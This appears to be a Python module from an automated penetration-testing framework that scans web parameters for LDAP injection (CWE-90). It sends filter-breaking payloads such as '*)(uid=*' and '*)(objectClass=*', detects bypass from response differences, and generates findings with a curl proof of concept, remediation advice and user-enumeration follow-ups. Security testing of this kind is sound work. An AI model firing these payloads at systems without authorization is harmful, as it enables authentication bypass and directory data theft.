"""`scan_ldap_injection` — deterministic LDAP-injection specialist
(workitem.md Phase 2.8).

Closes CWE-90 (improper neutralization of special elements used in an
LDAP query). Common in enterprise apps that authenticate against
Active Directory / OpenLDAP via filter strings like
`(&(uid=USER)(password=PWD))`. Concatenating user input into the
filter without escaping enables auth bypass + record enumeration.

Detection strategy
------------------

Baseline-vs-probe differential. Probe with LDAP filter
metacharacters that change query semantics:

  1. **Wildcard close** — `*)(uid=*` — closes the original filter
     and starts a new clause that matches everything.
  2. **OR-true** — `*)(|(uid=*` — OR with a wildcard.
  3. **Null byte close** — `*)(uid=*))(|(uid=*` — closes nested
     clauses for stricter parsers.
  4. **Wildcard only** — `*` — bypasses filters that just append
     a value to a wildcard match.

Detection signals:
  * 5xx + LDAP-engine markers (`LDAPException`, `javax.naming.ldap`,
    `LDAP error 0x...`).
  * Baseline 401/empty → probe 200 with data.
  * Length expansion at 200.
  * Success markers (token/welcome/authenticated) absent from baseline.

Auto-emits CWE-90 finding on detection. Severity: high.
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload, description, severity)
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    (
        "ldap_wildcard_close",
        "*)(uid=*",
        "Wildcard close — close the original filter, match everything",
        "high",
    ),
    (
        "ldap_or_wildcard",
        "*)(|(uid=*",
        "OR-true — OR with wildcard catches all records",
        "high",
    ),
    (
        "ldap_nested_close",
        "*)(uid=*))(|(uid=*",
        "Nested-clause close for stricter parsers",
        "high",
    ),
    (
        "ldap_wildcard_only",
        "*",
        "Wildcard alone — bypasses filters that only append",
        "high",
    ),
    (
        "ldap_objectclass_star",
        "*)(objectClass=*",
        "objectClass=* matches every entry",
        "high",
    ),
)


def _swap_param(url: str, param: str, value: str) -> str:
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    flat[param] = value
    return urlunparse(parts._replace(query=urlencode(flat, doseq=False)))


def _is_evidence_of_injection(
    *, baseline_status: int, baseline_body: str,
    probe_status: int, probe_body: str,
) -> tuple[bool, str]:
    pb = (probe_body or "")
    bb = (baseline_body or "")

    # 5xx + LDAP exception markers — strong signal.
    if probe_status >= 500:
        markers = ("ldapexception", "javax.naming.ldap", "javax.naming.namingexception",
                   "ldap error", "ldap: error code", "directoryservicesexception",
                   "ldap_search", "ldap.directoryEntry")
        lower = pb.lower()
        if any(m in lower for m in markers):
            return True, "LDAP engine exception leaked in response"
        return False, f"probe status {probe_status} (no LDAP markers)"

    # Auth bypass (baseline failed, probe succeeded).
    baseline_failure = (
        baseline_status in (401, 403, 404)
        or "invalid" in bb.lower() or "not found" in bb.lower()
        or bb.strip() in {"[]", "{}", "null", ""}
    )
    probe_success = (
        probe_status == 200 and len(pb) > max(50, len(bb) + 100)
    )
    if baseline_failure and probe_success:
        return True, "baseline failed → probe returned data (LDAP query bypass)"

    # Success markers absent from baseline.
    success_markers = ("\"token\":", "\"jwt\":", "\"success\": true",
                       "\"authenticated\": true", "welcome", "logged in",
                       "cn=", "dn=", "ou=")
    new_markers = [m for m in success_markers
                   if m in pb.lower() and m not in bb.lower()]
    if new_markers:
        return True, f"probe includes LDAP success markers absent from baseline: {new_markers}"

    # Length expansion.
    if probe_status == 200 and len(bb) > 0 and len(pb) > len(bb) * 2 + 100:
        return True, f"response grew {len(bb)}B → {len(pb)}B"

    return False, "responses similar"


def _emit_finding(
    *,
    url: str,
    param: str,
    probe_label: str,
    payload: str,
    evidence_reason: str,
    response_excerpt: str,
    severity: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=f"LDAP injection in `{param}` parameter",
            severity=severity,
            cwe="CWE-90",
            endpoint=url,
            target=url,
            category="ldap_injection",
            verification_status="verified",
            confidence=0.9,
            description=(
                f"The `{param}` parameter at `{url}` is concatenated into "
                f"an LDAP filter string on the server. Probe `{probe_label}` "
                f"with payload `{payload}` returned a response that materially "
                f"differs from the baseline.\n  Evidence: {evidence_reason}"
            ),
            impact=(
                "LDAP injection. The application builds an LDAP filter "
                "string by concatenating user input. Common targets:\n"
                "  * Active Directory / OpenLDAP authentication "
                "    bypass — `*)(uid=*` matches every user.\n"
                "  * Record enumeration — pull every entry from the "
                "    directory tree.\n"
                "  * Password-attribute extraction (when "
                "    `userPassword` is readable) — pivot to credential "
                "    theft.\n"
                "  * Boolean blind enumeration — leak attribute values "
                "    char-by-char via response shape."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {probe_label}\n"
                f"Payload: {payload}\n"
                f"Evidence: {evidence_reason}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. Compare to baseline; bypass succeeds when "
                f"response is materially different.\n"
                f"3. Pivot: enumerate users with `*)(objectClass=*` "
                f"and follow up with attribute-leak payloads."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. Escape LDAP special characters server-side BEFORE "
                "building the filter:\n"
                "     special: `*` `(` `)` `\\` NUL `/`\n"
                "     replace each with its `\\HH` two-hex form.\n"
                "2. Use the LDAP API's parameter-binding equivalent "
                "(if your library supports it). Java JNDI's "
                "`SearchControls.setReturningAttributes()` is NOT a "
                "substitute for filter escaping.\n"
                "3. Apply schema-allowlist: reject input that doesn't "
                "match `^[a-zA-Z0-9._-]+$` for username-shaped params."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "U", "C": "H", "I": "H", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with LDAP payload `{probe_label}`.",
                f"Payload: {payload}",
                f"Evidence: {evidence_reason}",
                "Server concatenates input into an LDAP filter.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=param,
                cwe="CWE-90", severity=severity, category="ldap_injection",
                method="GET", detection_kind=probe_label[:60], confidence=0.9,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_ldap_injection: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_ldap_injection: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="ldap-injection-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_ldap_injection(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """Deterministic LDAP-injection scanner."""
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        ldap_lexicon = {
            "username", "user", "uid", "userid", "email", "mail",
            "cn", "dn", "sn", "givenname", "name",
            "filter", "search", "q", "query",
            "department", "ou", "group",
        }
        params = [k for k in qs_keys if k.lower() in ldap_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no LDAP-shaped params found",
        )

    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        try:
            base_resp = pm.send_simple_request(
                "GET", _swap_param(url, p, "__strix_baseline__"),
                headers=extra_headers, body="", timeout=15,
            )
            probe_count += 1
        except Exception as e:  # noqa: BLE001
            evidence.append(f"baseline transport error for {p}: {e}")
            continue
        if "error" in base_resp and not base_resp.get("status_code"):
            continue
        baseline_body = base_resp.get("body") or ""
        baseline_status = int(base_resp.get("status_code") or 0)

        for label, payload, _description, severity in _PROBES:
            probe_url = _swap_param(url, p, payload)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            probe_body = resp.get("body") or ""
            probe_status = int(resp.get("status_code") or 0)
            ok, reason = _is_evidence_of_injection(
                baseline_status=baseline_status, baseline_body=baseline_body,
                probe_status=probe_status, probe_body=probe_body,
            )
            if not ok:
                continue
            seen_endpoint_param.add(key)
            excerpt = probe_body[:1200]
            rid = _emit_finding(
                url=url, param=p,
                probe_label=label, payload=payload,
                evidence_reason=reason,
                response_excerpt=excerpt,
                severity=severity,
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"LDAP injection in `{p}` ({label})",
                severity=severity, cwe="CWE-90",
                endpoint=url, category="ldap_injection",
                verification_status="verified", confidence=0.9,
                description=f"LDAP: {label} → {reason}",
            ))
            evidence.append(f"LDAP injection: {p} via {label}; {reason}")
            break

    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="ldap_injection")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_ldap_injection"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["enumerate users via `*)(uid=*` + dump entries"]
            if drafts else
            ["no LDAP injection on listed params; check POST body fields "
             "and auth endpoints, especially enterprise SSO portals"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
